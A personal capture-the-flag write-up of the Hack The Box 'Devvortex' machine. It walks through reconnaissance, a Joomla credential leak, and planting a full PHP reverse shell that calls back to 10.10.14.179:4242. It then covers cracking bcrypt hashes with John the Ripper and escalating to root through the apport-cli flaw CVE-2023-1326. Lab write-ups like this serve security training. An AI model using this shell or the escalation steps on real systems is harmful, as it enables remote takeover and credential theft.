## Reconnaissance

- Conducted an NMAP scan 
- `sudo nmap -sC -sV -n -Pn --min-rate 5000 --disable-arp-ping -p- 10.10.11.242 -oA initial`
- Ports 22 and 80 were open
- The webpage appears to be a static page. There's a contact form and a subscription form which are the only two forms of interaction with the page.
- Ran dirsearch and found:
	- css
	- Images
	- Js
	- Index.html
- All of which were 403
- Nginx version is 1.18 which has a listed vulnerability however, deeper investigation showed that there isn't a proven exploit for it. 
- I also looked at the Jquery version but nothing usable.
- Performed a UDP scan but nothing came up.
- I tried a gobuster dns scan however because there's no DNS server it wouldn't work. 
- I then pulled up a walkthrough as I was stumped. It mentioned that gobuster can be used to enumerate VHOSTs as well. 
- Did some quick googling and found this website
	- https://erev0s.com/blog/gobuster-directory-dns-and-virtual-hosts-bruteforcing/
- So used the following command:
	- `gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discover/DNS/subdomains-top1million-5000.txt`
- This didn't return anything. The walkthrough did find something so a little more digging and I realised the timeout must be too short. Used the following command:
	- `gobuster vhost --timeout 20s --append-domain -u http://devvortex.htb/ -w /usr/share/wordlists/seclists/Discover/DNS/subdomains-top1million-5000.txt`
- This found the vhost dev.devvortex.htb
- Added this to the /etc/hosts file and then browsed to it. It's another website so performed a directory enumeration on it with:
	- `gobuster dir -u http://dev.devvortex.htb/ -w /usr/share/dirb/wordlists/common.txt`
- Of note with this one you need to include the trailing / for the the url to work.
- This returned the folder /administator
- This brings up a login page for Joomla
- Joomla doesn't have a default password, it's set when you set it up so I tried some common combinations with no luck.
- I couldn't find the Joomla version quickly so I fired up Metasploit to see what exploits it had available for Joomla.
- Did a search for Joomla and the Joomla_api_improper_access_checks scanner was recent and looked promising. 
- Loaded the scanner
	- `use auxiliary/scanner/http/joomla_api_improper_access_checks`
	- `set rhosts 10.10.11.242`
	- `run`
- The following information was returned

## Weaponisation

- Logged using the Lewis Account
- Information Recovered
	- Joomla Version: 4.2.6
	- Running PHP 7.4.3
- I haven't worked with Joomla before so I was struggling on where to modify the templates. 
- Found it under System -> Configuration -> Templates -> Administrator Templates
- I created a new PHP template
- Added the following code

```
<?php set_time_limit (0); $VERSION = "1.0"; $ip = "10.10.14.179"; $port = 4242; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Cannot fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Cannot setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Cannot spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print "$string\\n"; } } ?>

- I went down a rabbit hole looking at PrivEsc exploits for Linux with no luck. 
- I took a quick look at the Walkthrough and there was a piece of information that I had overlooked from the Credential Leak. 
- Earlier I had looked at the Joomla DB but I didn't look close enough. 
- The user Logan has logged into Joomla. Logan is also a local user with a home directory.
- Pulled the user table
	- `logan / logan@devvortex.htb / $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12`
	- `lewis / lewis@devvortex.htb / $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u`
- Used JTR with brcypt format
- `john --format=bcrypt --wordlist=rockyou.txt hashes`
- Recovered the following password: tequieromucho

## Delivery

- I was able to su to Logan with that password. 
- Recovered the user flag `607620777899361129f7b29ba737074c`
- Running `sudo -l` showed that apport-cli can be run as sudo without a password
- Checking the version and its 2.20 which has a privilege escalation exploit against it
	- CVE-2023-1326
	- https://github.com/advisories/GHSA-qgrc-7333-5cgx
- All you need to do is run the apport-cli command against a crash report
- This is where I got stuck. I think there were supposed to be crash reports on the box but there weren't any. 
- I messed around with an exploit from exploit-db which did all the work for you but it contained a compiled C program and the required libraries weren't on the target box. 
- I found a video walkthrough for this box to see if it showed how to create a crash report.

## Exploitation

- All I had to do was segfault an application
- The command used was `sleep 13 & killall -SIGSEGV sleep` this dropped back to the command line and the next command caused a segfault which generated a crash report in /var/crash
- I was then able to run the following:
	- `sudo /var/bin/apport-cli -c /var/crash/_bin_sleep.100.crash`
- Once the : was on the screen you are able to run commands prefixing them with an !

## Actions on Objective

- The root flag was recovered from /root/root. Txt
